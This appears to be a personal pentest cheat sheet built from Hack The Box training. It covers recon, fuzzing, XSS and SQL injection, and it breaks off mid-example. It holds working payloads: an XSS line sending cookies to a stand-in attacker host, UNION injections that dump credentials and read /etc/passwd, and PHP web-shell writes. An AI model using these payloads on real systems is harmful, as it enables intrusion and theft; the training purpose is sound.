# Pentest Commands

-------------------------

## Web Requests

> Basic web request

```bash
curl inlanefreight.com
```
> To output raw request


```bash
curl -O inlanefreight.com/index.html
```


> HTTP version 1.X sends requests as clear-text, and uses a new-line character to separate different fields and different requests. HTTP version 2.X, on the other hand, sends requests as binary data in a dictionary form.

> We can use custom User-Agent flags via curl using:

```bash
curl https://www.inlanefreight.com -A 'Mozilla/5.0'
```

> Other headers can be added using '-H' Flag


> Session Cookie --> 'PHPSESSID=knc0d70407noh2rjb3ds3i144d'


> Third Flag via learning curl post based request json data

```bash
curl 'http://178.62.23.240:31245/search.php'  -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://178.62.23.240:31245/' -H 'Content-Type: application/json' -H 'Origin: http://178.62.23.240:31245' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=knc0d70407noh2rjb3ds3i144d' --data-raw '{"search":"flag"}'                
["flag: HTB{p0$t_r3p34t3r}"] 
```

-----------------------------

## XSS

```js
'**#"><img src=/ onerror=alert(document.cookie)>**'
// Getting file from remote site
'**"><script src=//www.example.com/exploit.js></script>**'

```
-----------------------------
# INFORMATION GATHERING PHASE:


>whois
> DNS
```bash
nslookup -query=A $TARGET # The query can have all A, PTR, MX, ANY
dig a www.facebook.com @1.1.1.1 # Same we can change ptr to whatever record we want. Where 1.1.1.1 in this case is dns server or name server ip of it.
# FOR PTR RECORD USE IP ADDRESS OF TARGET.

```

## SUBDOMAINS:

Virus Total
```bash
curl -s https://sonar.omnisint.io/subdomains/$TARGET | jq -r '.[]' | sort -u # This is to find the subdomains
curl -s https://sonar.omnisint.io/tlds/$TARGET | jq -r '.[]' | sort -u # This is to find the tlds
curl -s https://sonar.omnisint.io/all/$TARGET | jq -r '.[]' | sort -u # This is to find both above all tht things
curl -s "https://crt.sh/?q=${TARGET}&output=json" | jq -r '.[] | "\(.name_value)\n\(.common_name)"' | sort -u > "${TARGET}_crt.sh.txt" # Frpm crt.sh
# Getting Subdomains using openssl
export TARGET="facebook.com"
export PORT="443"
openssl s_client -ign_eof 2>/dev/null <<<$'HEAD / HTTP/1.0\r\n\r' -connect "${TARGET}:${PORT}" | openssl x509 -noout -text -in - | grep 'DNS' | sed -e 's|DNS:|\n|g' -e 's|^\*.*||g' | tr -d ',' | sort -u
# USING THEHARVESTER
s3curityguy@htb[/htb]$ cat sources.txt

baidu
bufferoverun
crtsh
hackertarget
otx
projecdiscovery
rapiddns
sublist3r
threatcrowd
trello
urlscan
vhost
virustotal
zoomeye

# Once this file is created we will supply it to theharvester
cat sources.txt | while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}_${TARGET}";done

# We can filter subdomains from this outsput as:
cat *.json | jq -r '.hosts[]' 2>/dev/null | cut -d':' -f 1 | sort -u > "${TARGET}_theHarvester.txt"
```

# Infrastructure identification:
```bash
https://sitereport.netcraft.com
waybackurls
```

---------------------------------------------
# ACTIVE INFRASTRUCTURE IDENTIFICATION:

> If we get to know the iis version of the app, we can guess default os it comes with

>    IIS 6.0: Windows Server 2003
    IIS 7.0-8.5: Windows Server 2008 / Windows Server 2008R2
    IIS 10.0 (v1607-v1709): Windows Server 2016
    IIS 10.0 (v1809-): Windows Server 2019


```bash
# Web server version if present in response headers can be retrieved by
curl -I "http://${TARGET}"
# X-Powered-By header: This header can tell us what the web app is using. We can see values like PHP, ASP.NET, JSP, etc.
#    .NET: ASPSESSIONID<RANDOM>=<COOKIE_VALUE>
#   PHP: PHPSESSID=<COOKIE_VALUE>
#   JAVA: JSESSION=<COOKIE_VALUE>

# WHATWEB
whatweb -a3 https://www.facebook.com -v

# To know the background security solutions implemented
wafw00f -v https://www.tesla.com

# SCREENSHOT
cat facebook_aquatone.txt | aquatone

```

## Zone Transfers:

```bash
# Easy site 
https://hackertarget.com/zone-transfer/ 
# Manual approach is bit with steps
nslookup -type=NS zonetransfer.me # This will list the name servers.

# Perform zone transfer using any and axfr records
nslookup -type=any -query=AXFR zonetransfer.me nsztm1.digi.ninja
```

```bash
# Performing dns enum using gobuster

s3curityguy@htb[/htb]$ export TARGET="facebook.com"
s3curityguy@htb[/htb]$ export NS="d.ns.facebook.com"
s3curityguy@htb[/htb]$ export WORDLIST="numbers.txt"
s3curityguy@htb[/htb]$ gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"

Found: lert-api-shv-01-sin6.facebook.com
Found: atlas-pp-shv-01-sin6.facebook.com
Found: atlas-pp-shv-02-sin6.facebook.com
Found: atlas-pp-shv-03-sin6.facebook.com
Found: lert-api-shv-03-sin6.facebook.com
Found: lert-api-shv-02-sin6.facebook.com
Found: lert-api-shv-04-sin6.facebook.com
Found: atlas-pp-shv-04-sin6.facebook.com

```

> FLAG1 FOUND
`HTB{h8973hrpiusnzjoie7zrou23i4zhmsxi8732zjso}`


## VHOST ENUM:

```bash
ffuf -w ./vhosts -u http://192.168.10.10 -H "HOST: FUZZ.randomtarget.com" -fs 612
└─$ ffuf -w /usr/share/sniper/wordlists/vhosts.txt  -u http://10.129.54.144 -H "HOST: FUZZ.inlanefreight.htb" -fs 612

```

## FUZZ:

```bash
# DirBusting with ffuf
ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://206.189.125.243:30820/FUZZ

# Testing server extensions and guessing language:
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ
# If we get to know that the file extension is php, then we can continue fuzzing file name with that extension:
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php
# Example
ffuf -w /usr/share/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://206.189.125.243:31917/blog/indexFUZZ
ffuf -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://206.189.125.243:31917/blog/FUZZ.php

# Now to do a recursive automated dir scan.:
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
# Example
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://206.189.125.243:31917/FUZZ -recursion -recursion-depth 1 -e .php -v

# Subdomain Finding Using FFUF:
ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.hackthebox.eu/

# VHOST FINDING WITH FFUF:
ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'
# If we want to filter the response using its size
ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs 900

# PARAMETER FUZZING:
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:32263/courses/admin/admin.php?FUZZ=key -fs xxx

# POST PARAMETER FUZZING:
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:30038/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```
> In PHP, "POST" data "content-type" can only accept "application/x-www-form-urlencoded". So, we can set that in "ffuf" with "-H 'Content-Type: application/x-www-form-urlencoded'"

## JS DEOBFUSCATION:

http://www.jsnice.org/

## Hex Encode

To encode any string into hex in Linux, we can use the xxd -p command:

```bash
s3curityguy@htb[/htb]$ echo https://www.hackthebox.eu/ | xxd -p

68747470733a2f2f7777772e6861636b746865626f782e65752f0a
```
## Hex Decode

To decode a hex encoded string, we can use the xxd -p -r command:

```bash
s3curityguy@htb[/htb]$ echo 68747470733a2f2f7777772e6861636b746865626f782e65752f0a | xxd -p -r

https://www.hackthebox.eu/
```

## Rot13 Encode

>There isn't a specific command in Linux to do rot13 encoding. However, it is fairly easy to create our own command to do the character shifting:
Rot13 Encode
```bash
s3curityguy@htb[/htb]$ echo https://www.hackthebox.eu/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'

uggcf://jjj.unpxgurobk.rh/
```
## Rot13 Decode

> We can use the same previous command to decode rot13 as well:
Rot13 Decode
```
s3curityguy@htb[/htb]$ echo uggcf://jjj.unpxgurobk.rh/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'

https://www.hackthebox.eu/
```

> We can identify any kind of encoding using https://www.boxentriq.com/code-breaking/cipher-identifier


# XSS:

## Stored XSS

> We can Test if field is vulnerable using:
```js
<script>alert(window.origin)</script>
```
> As some modern browsers may block the alert() JavaScript function in specific locations, it may be handy to know a few other basic XSS payloads to verify the existence of XSS. One such XSS payload is <plaintext>, which will stop rendering the HTML code that comes after it and display it as plaintext.

> Another easy-to-spot payload is <script>print()</script> that will pop up the browser print dialog, which is unlikely to be blocked by any browsers. Try using these payloads to see how each works. You may use the reset button to remove any current payloads.

## DOM XSS:
```js
<img src="" onerror=alert(window.origin)>
```
>Some of the common open-source tools that can assist us in XSS discovery are XSS Strike, Brute XSS, and XSSer. We can try XSS Strike by cloning it to our VM with git clone:
https://github.com/s0md3v/XSStrike
https://github.com/rajeshmajumdar/BruteXSS
https://github.com/rajeshmajumdar/BruteXSS

```bash
s3curityguy@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.git
s3curityguy@htb[/htb]$ cd XSStrike
s3curityguy@htb[/htb]$ pip install -r requirements.txt
s3curityguy@htb[/htb]$ python xsstrike.py
```

> Paylods for the xss brute are:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
https://github.com/payloadbox/xss-payload-list

### Commands

| Code | Description |
| ----- | ----- |
| **XSS Payloads** |
| `<script>alert(window.origin)</script>` | Basic XSS Payload |
| `<plaintext>` | Basic XSS Payload |
| `<script>print()</script>` | Basic XSS Payload |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |
| `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element |
| `<script src="http://OUR_IP/script.js"></script>` | Load remote script |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send Cookie details to us |
| **Commands** |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run `xsstrike` on a url parameter |
| `sudo nc -lvnp 80` | Start `netcat` listener |
| `sudo php -S 0.0.0.0:80 ` | Start `PHP` server |

> DEFACING WEBSITE POC FOR STORED XSS:
```js
<script>document.body.style.background = "#141d2b"</script>

// OR CHANGE THE BG IMAGE:
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

-------------------------------

## MySQL

| **Command**   | **Description**   |
| --------------|-------------------|
| **General** |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | login to mysql database |
| `SHOW DATABASES` | List available databases |
| `USE users` | Switch to database |
| **Tables** |
| `CREATE TABLE logins (id INT, ...)` | Add a new table |
| `SHOW TABLES` | List available tables in current database |
| `DESCRIBE logins` | Show table properties and columns |
| `INSERT INTO table_name VALUES (value_1,..)` | Add values to table |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | Update table values |
| **Columns** |
| `SELECT * FROM table_name` | Show all columns in a table |
| `SELECT column1, column2 FROM table_name` | Show specific columns in a table |
| `DROP TABLE logins` | Delete a table |
| `ALTER TABLE logins ADD newColumn INT` | Add new column |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | Rename column |
| `ALTER TABLE logins MODIFY oldColumn DATE` | Change column datatype |
| `ALTER TABLE logins DROP oldColumn` | Delete column |
| **Output** |
| `SELECT * FROM logins ORDER BY column_1` | Sort by column |
| `SELECT * FROM logins ORDER BY column_1 DESC` | Sort by column in descending order |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | Sort by two-columns |
| `SELECT * FROM logins LIMIT 2` | Only show first two results |
| `SELECT * FROM logins LIMIT 1, 2` | Only show first two results starting from index 2 |
| `SELECT * FROM table_name WHERE <condition>` | List results that meet a condition |
| `SELECT * FROM logins WHERE username LIKE 'admin%'` | List results where the name is similar to a given string |

## MySQL Operator Precedence
* Division (`/`), Multiplication (`*`), and Modulus (`%`)
* Addition (`+`) and Subtraction (`-`)
* Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

## SQL Injection
| **Payload**   | **Description**   |
| --------------|-------------------|
| **Auth Bypass** |
| `admin' or '1'='1` | Basic Auth Bypass |
| `admin')-- -` | Basic Auth Bypass With comments |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |
| **Union Injection** |
| `' order by 1-- -` | Detect number of columns using `order by` |
| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection |
| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection |
| `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
| **DB Enumeration** |
| `SELECT @@version` | Fingerprint MySQL with query output |
| `SELECT SLEEP(5)` | Fingerprint MySQL with no output |
| `cn' UNION select 1,database(),2,3-- -` | Current database name |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
| **Privileges** |
| `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -` | Find if all user privileges |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| **File Injection** |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |

## Non relational Database:
```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
```

>It looks similar to a dictionary item in languages like Python or PHP (i.e. {'key':'value'}), where the key is usually a string, and the value can be a string, dictionary, or any class object.The most common example of a NoSQL database is MongoDB.

>before we start subverting the web application's logic and attempting to bypass the authentication, we first have to test whether the login form is vulnerable to SQL injection. To do that, we will try to add one of the below payloads after our username and see if it causes any errors or changes how the page behaves:

|Payload|URL Encoded|
|-------|-----------|
|'|%27|
|"|%22|
|#|%23|
|;|%3B|
|)|%29|

>As an initial guess, if the webserver we see in HTTP responses is Apache or Nginx, it is a good guess that the webserver is running on Linux, so the DBMS is likely MySQL. The same also applies to Microsoft DBMS if the webserver is IIS, so it is likely to be MSSQL. However, this is a far-fetched guess, as many other databases can be used on either operating system or web server. So, there are different queries we can test to fingerprint the type of database we are dealing with.

## THIS IS HOW WE IDENTIFY MYSQL SERVER AND ENUMERATE IT:

|Payload|     When to Use|     Expected Output|     Wrong Output|
|-------|----------------|---------------------|-----------------|
|SELECT @@version|    When we have full query output|  MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1'|In MSSQL it returns MSSQL version.Error with other DBMS.|
|SELECT POW(1,1)|     When we only have numeric output|    1|   Error with other DBMS|
|SELECT SLEEP(5)|     Blind/No Output|     Delays page response for 5 seconds and returns 0.|   Will not delay response with other DBMS|


>The INFORMATION_SCHEMA database contains metadata about the databases and tables present on the server. This database plays a crucial role while exploiting SQL injection vulnerabilities. As this is a different database, we cannot call its tables directly with a SELECT statement. If we only specify a table's name for a SELECT statement, it will look for tables within the same database.

>So, to reference a table present in another DB, we can use the dot ‘.’ operator. For example, to SELECT a table users present in a database named my_database, we can use:


```sql
SELECT * FROM my_database.users;
```

#### SCHEMATA:
>To start our enumeration, we should find what databases are available on the DBMS. The table SCHEMATA in the INFORMATION_SCHEMA database contains information about all databases on the server. It is used to obtain database names so we can then query them. The SCHEMA_NAME column contains all the database names currently present.Let us first test this on a local database to see how the query is used:

```sql
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
6 rows in set (0.01 sec)

```

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

>We can find the current database with the SELECT database() query.

```sql
cn' UNION select 1,database(),2,3-- -

```

>The TABLES table contains information about all tables throughout the database. This table contains multiple columns, but we are interested in the TABLE_SCHEMA and TABLE_NAME columns. The TABLE_NAME column stores table names, while the TABLE_SCHEMA column points to the database each table belongs to. This can be done similarly to how we found the database names. For example, we can use the following payload to find the tables within the dev database:

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

>The COLUMNS table contains information about all columns present in all the databases. This helps us find the column names to query a table for. The COLUMN_NAME, TABLE_NAME, and TABLE_SCHEMA columns can be used to achieve this. As we did before, let us try this payload to find the column names in the credentials table:


```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

>Now that we have all the information, we can form our UNION query to dump data of the username and password columns from the credentials table in the dev database. We can place username and password in place of columns 2 and 3:


```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

#### READING FILES:

> If we do have DBA privileges, then it is much more probable that we have file-read privileges. If we do not, then we have to check our privileges to see what we can do. To be able to find our current DB user, we can use any of the following queries:

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```
>Our UNION injection payload will be as follows

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```
OR
```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```
##### User Privileges

Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:

```sql
SELECT super_priv FROM mysql.user
```
>Once again, we can use the following payload with the above query:
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```
We can also dump other privileges we have directly from the schema, with the following query:
```sql
SELECT sql_grants FROM information_schema.sql_show_grants
```
> Once again, we can add WHERE user="root" to only show our current user root privileges. Our payload would be:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```
> We see that the FILE privilege is listed for our user, enabling us to read files and potentially even write files. Thus, we can proceed with attempting to read files.


##### The LOAD_FILE():
> function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the /etc/passwd file:


```sql
SELECT LOAD_FILE('/etc/passwd');
```

> Similar to how we have been using a UNION injection, we can use the above query:

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

#### Write File Privileges

To be able to write files to the back-end server using a MySQL database, we require three things:

   1. User with FILE privilege enabled
   2. MySQL global secure_file_priv variable not enabled
   3. Write access to the location we want to write to on the back-end server

> The secure_file_priv variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, NULL means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the FILE privilege. However, MySQL uses /var/lib/mysql-files as the default folder. This means that reading files through a MySQL injection isn't possible with default settings. Even worse, some modern configurations default to NULL, meaning that we cannot read/write files anywhere within the system.

So, let's see how we can find out the value of secure_file_priv. Within MySQL, we can use the following query to obtain the value of this variable:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```
>MySQL global variables are stored in a table called global_variables, and as per the documentation, this table has two columns variable_name and variable_value.

We have to select these two columns from that table in the INFORMATION_SCHEMA database. There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. We will then filter the results to only show the secure_file_priv variable, using the WHERE clause we learned about in a previous section.

The final SQL query is the following:

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

> In our case, the query looks like this:

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

>secure_file_priv value is empty, meaning that we can read/write files to any location.


##### SELECT INTO FILE:

Now that we have confirmed that our user should write files to the back-end server, let's try to do that using the SELECT .. INTO OUTFILE statement. The SELECT INTO OUTFILE statement can be used to write data from select queries into files. This is usually used for exporting data from tables.

To use it, we can add INTO OUTFILE '...' after our query to export the results into the file we specified. The below example saves the output of the users table into the /tmp/credentials file:

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```
> To write to a file:
```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

> To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use load_file to read the server configuration, like Apache's configuration found at /etc/apache2/apache2.conf, Nginx's configuration at /etc/nginx/nginx.conf, or IIS configuration at %WinDir%\System32\Inetsrv\Config\ApplicationHost.config, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using this wordlist for Linux or this wordlist for Windows. Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.


>The UNION injection payload would be as follows:
```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

> NOW TO GET REVERSE SHELL USING THIS:
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/shell.php'-- -
```

## SQLMAP USAGE:

| **Command**                                                  | **Description**                                             |
| ------------------------------------------------------------ | ----------------------------------------------------------- |
| `sqlmap -h`                                                  | View the basic help menu                                    |
| `sqlmap -hh`                                                 | View the advanced help menu                                 |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`   | Run `SQLMap` without asking for user input                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`  | `SQLMap` with POST request                                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'` | POST request specifying an injection point with an asterisk |
| `sqlmap -r req.txt`                                          | Passing an HTTP request file to `SQLMap`                    |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'` | Specifying a cookie header                                  |
| `sqlmap -u www.target.com --data='id=1' --method PUT`        | Specifying a PUT request                                    |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt` | Store traffic to an output file                             |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch` | Specify verbosity level                                     |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"` | Specifying a prefix or suffix                               |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`             | Specifying the level and risk                               |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba` | Basic DB enumeration                                        |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb` | Table enumeration                                           |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname` | Table/row enumeration                                       |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` | Conditional enumeration                                     |
| `sqlmap -u "http://www.example.com/?id=1" --schema`          | Database schema enumeration                                 |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`  | Searching for data                                          |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch` | Password enumeration and cracking                           |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass                                      |
| `sqlmap --list-tampers`                                      | List all tamper scripts                                     |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba` | Check for DBA privileges                                    |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"` | Reading a local file                                        |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Writing a file                                              |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell`        | Spawning an OS shell                                        |

> To run SQLMap against this example, located at the example URL http://www.example.com/vuln.php?id=1, would look like the following:

```bash
s3curityguy@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

where --batch is used to skip all the interactive questions

>By pasting the clipboard content (Ctrl-V) into the command line, and changing the original command curl to sqlmap, we are able to use SQLMap with the identical curl command:
```bash
s3curityguy@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```
### GET/POST Requests

> In the most common scenario, GET parameters are provided with the usage of option -u/--url, as in the previous example. As for testing POST data, the --data flag can be used, as follows:

```bash
s3curityguy@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

>In such cases, POST parameters uid and name will be tested for SQLi vulnerability. For example, if we have a clear indication that the parameter uid is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using -p uid. Otherwise, we could mark it inside the provided data with the usage of special marker * as follows:

```sql
s3curityguy@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

#### Sql map using requests file:
> We can either manually copy the HTTP request from within Burp and write it to a file, or we can right-click the request within Burp and choose Copy to file. Another way of capturing the full HTTP request would be through using the browser, as mentioned earlier in the section, and choosing the option Copy > Copy Request Headers, and then pasting the request into a file.

> To run SQLMap with an HTTP request file, we use the -r flag, as follows:

```bash
s3curityguy@htb[/htb]$ sqlmap -r req.txt
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.9}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 14:32:59 /2020-09-11/

[14:32:59] [INFO] parsing HTTP request from 'req.txt'
[14:32:59] [INFO] testing connection to the target URL
[14:32:59] [INFO] testing if the target URL content is stable
[14:33:00] [INFO] target URL content is stable
```

#### Custom sqlmap requests:

>If we wanted to craft complicated requests manually, there are numerous switches and options to fine-tune SQLMap.For example, if there is a requirement to specify the (session) cookie value to PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c option --cookie would be used as follows:

```bash
s3curityguy@htb[/htb]$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

The same effect can be done with the usage of option -H/--header:
```bash
s3curityguy@htb[/htb]$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```
We can apply the same to options like --host, --referer, and -A/--user-agent, which are used to specify the same HTTP headers' values.

Furthermore, there is a switch --random-agent designed to randomly select a User-agent header value from the included database of regular browser values. This is an important switch to remember, as more and more protection solutions automatically drop all HTTP traffic containing the recognizable default SQLMap's User-agent value (e.g. User-agent: sqlmap/1.4.9.12#dev (http://sqlmap.org)). Alternatively, the --mobile switch can be used to imitate the smartphone by using that same header value.

> While SQLMap, by default, targets only the HTTP parameters, it is possible to test the headers for the SQLi vulnerability.The easiest way is to specify the "custom" injection mark after the header's value (e.g. --cookie="id=1\*")

>Also, if we wanted to specify an alternative HTTP method, other than GET and POST (e.g., PUT), we can utilize the option --method, as follows:

```bash
s3curityguy@htb[/htb]$ sqlmap -u www.target.com --data='id=1' --method PUT
```
#### CUSTOM HTTP REQUSTS:

> In case there is a json parameter you wanna test:
Apart from the most common form-data POST body style (e.g. id=1), SQLMap also supports JSON formatted (e.g. {"id":1}) and XML formatted (e.g. <element><id>1</id></element>) HTTP requests.

Support for these formats is implemented in a "relaxed" manner; thus, there are no strict constraints on how the parameter values are stored inside. In case the POST body is relatively simple and short, the option --data will suffice.

However, in the case of a complex or long POST body, we can once again use the -r option:

```bash
s3curityguy@htb[/htb]$ cat req.txt
HTTP / HTTP/1.0
Host: www.example.com

{
  "data": [{
    "type": "articles",
